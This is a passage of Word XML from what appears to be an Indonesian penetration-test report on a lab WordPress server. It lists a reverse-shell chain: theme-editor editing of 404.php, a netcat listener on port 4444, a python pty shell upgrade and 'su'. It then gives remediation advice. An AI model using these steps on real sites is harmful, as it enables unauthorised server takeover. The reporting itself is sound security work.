                            <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                            <w:u w:val="none"/>
                          </w:rPr>
                          <w:t>https://192.168.95.28/wordpress/wp-admin/theme-editor.php?file=404.php</w:t>
                        </w:r>
                      </w:hyperlink>
                      <w:r>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6542A551" w14:textId="77777777" w:rsidR="00FA4EA6" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                      <w:pPr>
                        <w:spacing w:line="240" w:lineRule="auto"/>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>nc</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t xml:space="preserve"> -</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>lvnp</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t xml:space="preserve"> 4444</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2CE38067" w14:textId="399828A2" w:rsidR="00FA4EA6" w:rsidRDefault="00FA4EA6" w:rsidP="00B3095B">
                      <w:pPr>
                        <w:spacing w:line="240" w:lineRule="auto"/>
                      </w:pPr>
                      <w:r w:rsidRPr="00FA4EA6">
                        <w:t>http://192.168.95.28/wordpress/wp-content/themes/TwentyTwelve/404.php</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5D62C690" w14:textId="77777777" w:rsidR="00FA4EA6" w:rsidRDefault="00FA4EA6" w:rsidP="00B3095B">
                      <w:pPr>
                        <w:spacing w:line="240" w:lineRule="auto"/>
                      </w:pPr>
                      <w:r w:rsidRPr="00FA4EA6">
                        <w:t xml:space="preserve">python -c 'import </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00FA4EA6">
                        <w:t>pty</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00FA4EA6">
                        <w:t xml:space="preserve">; </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00FA4EA6">
                        <w:t>pty.spawn</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00FA4EA6">
                        <w:t>("/bin/bash")'</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="24C05178" w14:textId="4BFB2DAE" w:rsidR="00FA4EA6" w:rsidRDefault="00FA4EA6" w:rsidP="00B3095B">
                      <w:pPr>
                        <w:spacing w:line="240" w:lineRule="auto"/>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00FA4EA6">
                        <w:t>su</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00FA4EA6">
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r>
                        <w:t>–</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7264A03A" w14:textId="3E25E227" w:rsidR="00B3095B" w:rsidRPr="00FA4EA6" w:rsidRDefault="00FA4EA6" w:rsidP="00B3095B">
                      <w:pPr>
                        <w:spacing w:line="240" w:lineRule="auto"/>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00FA4EA6">
                        <w:t>whoami</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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r w:rsidR="00650907">
                        <w:br/>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidR="00B3095B">
                        <w:t>whoami</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="57A425D8" w14:textId="08AB712B" w:rsidR="00D14E6A" w:rsidRDefault="00D14E6A" w:rsidP="005738E1">
                      <w:r>
                        <w:br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36AF7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="305FF1D8" w14:textId="640D2CE4" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Rekomendasi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BCDC90D" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Berdasarkan kerentanan yang sudah ditemukan, berikut adalah rekomendasi perbaikan yang dapat diimplementasikan sehingga dapat memitigasi dampaknya:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC17970" w14:textId="36412A2D" w:rsidR="004E4349" w:rsidRPr="00910CF6" w:rsidRDefault="00D063CD" w:rsidP="00910CF6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D063CD">
        <w:t>Mela</w:t>
      </w:r>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>kukan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>perbaikan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>kode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>dengan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>menerapkan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> Prepared Statements pada </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>halaman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> login </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>untuk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>menutup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>celah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>keamanan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> SQL Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653611E0" w14:textId="2FA84085" w:rsidR="00910CF6" w:rsidRPr="00910CF6" w:rsidRDefault="00910CF6" w:rsidP="00910CF6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>
        <w:t>Mem</w:t>
      </w:r>
      <w:r w:rsidRPr="00910CF6">
        <w:t>atikan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>fitur</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> Theme Editor </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>melalui</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>konfigurasi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> WordPress agar </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>penyerang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>tidak</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>bisa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>menyisipkan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> backdoor </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>berbahaya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>ke</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>dalam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>sistem</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7182BBC6" w14:textId="09F44841" w:rsidR="00836AF7" w:rsidRPr="00910CF6" w:rsidRDefault="00D063CD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D063CD">
        <w:t>Me</w:t>
      </w:r>
      <w:r w:rsidR="00910CF6">
        <w:t>ngg</w:t>
      </w:r>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>unakan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> password yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>berbeda</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>antara</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>akun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> admin website dan root server </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>untuk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>mencegah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>pengambilalihan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>sistem</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>secara</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> total </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>jika</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> website </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00910CF6" w:rsidRPr="00910CF6">
        <w:t>diretas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="28DDB9EF" w14:textId="2C05CF0A" w:rsidR="00910CF6" w:rsidRDefault="00910CF6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>
        <w:t>Mengh</w:t>
      </w:r>
      <w:r w:rsidRPr="00910CF6">
        <w:t>apus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> database atau file lama yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>sudah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>tidak</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>digunakan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>untuk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>meminimalisir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>potensi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>kebocoran</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t xml:space="preserve"> data </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00910CF6">
        <w:t>sensitif</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="62B4D4DD" w14:textId="77777777" w:rsidR="000A5404" w:rsidRDefault="00553B65">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/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>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00943ECD">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00EF70B2" w:rsidRPr="00EF70B2">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="00330F7C" wp14:editId="41E5AAF7">
            <wp:extent cx="6201640" cy="6706536"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="19836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7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0FD">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="000270FD" w:rsidRPr="000270FD">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2131F3B6" wp14:editId="7E03FFAC">
            <wp:extent cx="6280150" cy="3215005"/>
            <wp:effectExtent l="0" t="0" r="6350" b="4445"/>
            <wp:docPr id="6849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87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3D8">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="002853D8" w:rsidRPr="002853D8">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="19ECBEB2" wp14:editId="44D07707">
            <wp:extent cx="6280150" cy="5752465"/>
            <wp:effectExtent l="0" t="0" r="6350" b="635"/>
            <wp:docPr id="12985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1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8C9">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5C7848" w14:textId="7B17FF94" w:rsidR="004E4349" w:rsidRDefault="005748C9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005748C9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="158ED9E6" wp14:editId="6D9EAB21">
            <wp:extent cx="6280150" cy="1471131"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:docPr id="20871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0683" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill rotWithShape="1">
                    <a:blip r:embed="rId12"/>
                    <a:srcRect t="4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147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48EB">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="006A48EB" w:rsidRPr="006A48EB">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3241A24B" wp14:editId="68E44376">
            <wp:extent cx="6280150" cy="2620645"/>
            <wp:effectExtent l="0" t="0" r="6350" b="8255"/>
            <wp:docPr id="5681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2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F61">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00B87F61" w:rsidRPr="00B87F61">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="07EF96D0" wp14:editId="4D60B3B4">
            <wp:extent cx="6280150" cy="2943860"/>
            <wp:effectExtent l="0" t="0" r="6350" b="8890"/>
            <wp:docPr id="1670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FBA">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00023FBA" w:rsidRPr="00023FBA">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6B81096C" wp14:editId="337D94F8">
            <wp:extent cx="6280150" cy="2964180"/>
            <wp:effectExtent l="0" t="0" r="6350" b="7620"/>
            <wp:docPr id="21415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1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876">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="001E7876" w:rsidRPr="001E7876">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1D7233B7" wp14:editId="267FEF27">
            <wp:extent cx="6280150" cy="4044950"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:docPr id="21315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0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23F">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="0054223F" w:rsidRPr="0054223F">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6AA4EC4D" wp14:editId="443D0574">
            <wp:extent cx="6280150" cy="2809240"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:docPr id="2093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609">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00770609" w:rsidRPr="00770609">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="390A9C4D" wp14:editId="5E0F02F0">
            <wp:extent cx="6280150" cy="2603500"/>
            <wp:effectExtent l="0" t="0" r="6350" b="6350"/>
            <wp:docPr id="98332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8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34B">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AB734B">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AB734B" w:rsidRPr="00AB734B">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="39C41747" wp14:editId="05E9C638">
            <wp:extent cx="6280150" cy="4334510"/>
            <wp:effectExtent l="0" t="0" r="6350" b="8890"/>
            <wp:docPr id="30984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4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6D1">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="007E56D1" w:rsidRPr="007E56D1">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="78FB38B8" wp14:editId="799A40A6">
            <wp:extent cx="6280150" cy="3094355"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:docPr id="7270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37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83">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00EE6E83" w:rsidRPr="00EE6E83">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="55F67F0B" wp14:editId="3FADD40B">
            <wp:extent cx="6280150" cy="3163570"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:docPr id="31846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2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E6E83">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00EA6D5E" w:rsidRPr="00EA6D5E">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5FB8D0D3" wp14:editId="0F4C4EC5">
            <wp:extent cx="6280150" cy="1884680"/>
            <wp:effectExtent l="0" t="0" r="6350" b="1270"/>
            <wp:docPr id="2771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07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8A1">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="000C38A1" w:rsidRPr="000C38A1">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="232DCB34" wp14:editId="2ED94383">
            <wp:extent cx="6096851" cy="2219635"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="16028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2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BB8">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="007F2BB8" w:rsidRPr="007F2BB8">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="40D29EF7" wp14:editId="32C06C6F">
            <wp:extent cx="6280150" cy="1688465"/>
            <wp:effectExtent l="0" t="0" r="6350" b="6985"/>
            <wp:docPr id="1604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6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C79">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="005B4C79" w:rsidRPr="005B4C79">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3F2380CF" wp14:editId="78E36145">
            <wp:extent cx="6280150" cy="1903730"/>
            <wp:effectExtent l="0" t="0" r="6350" b="1270"/>
            <wp:docPr id="15088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4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A0F">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00F40A0F" w:rsidRPr="00F40A0F">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="28A6BCB8" wp14:editId="0E6091C3">
            <wp:extent cx="6280150" cy="1221740"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:docPr id="3654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6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349">
      <w:footerReference w:type="default" r:id="rId35"/>
      <w:footerReference w:type="first" r:id="rId36"/>
      <w:pgSz w:w="11906" w:h="16838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7E90" w14:textId="77777777" w:rsidR="008E7097" w:rsidRDefault="008E7097">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="6EB9DB6F" w14:textId="77777777" w:rsidR="008E7097" w:rsidRDefault="008E7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方正舒体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09BE" w14:textId="489EA827" w:rsidR="004E4349" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
    </w:pPr>
    <w:sdt>
      <w:sdtPr>
